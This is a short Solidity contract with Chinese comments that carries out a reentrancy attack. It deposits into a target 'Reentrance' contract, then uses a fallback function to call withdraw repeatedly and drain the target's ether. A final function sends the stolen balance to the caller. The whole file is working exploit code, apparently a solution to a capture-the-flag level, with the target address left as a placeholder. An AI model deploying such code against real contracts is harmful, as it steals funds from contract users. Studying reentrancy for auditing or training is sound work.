// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

// 定义目标合约接口
interface Reentrance {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
}

contract Exploit {

    //实例化目标合约接口
    Reentrance public re = Reentrance(payable("目标合约地址")); 

    //返回本合约的余额
    function balance() public view returns (uint256){
        return address(this).balance;
    }

    // 调用目标合约的 donate() ，可先充值 0.0001 eth
    function donate() public payable{
        re.donate{value:msg.value}(address(this));
    }
    // ** 触发重入 **
    function attack(uint _amount) public {
        re.withdraw(_amount);
    }

    //提币跑路，注意提币权限
    function withdraw() public {
        payable(msg.sender).transfer(address(this).balance);
    }


    // 合约收到 ETH 后反复触发
    fallback() external payable {
        if(address(re).balance >= 0.0001 ether){
            re.withdraw(0.0001 ether);
        }

    }
}
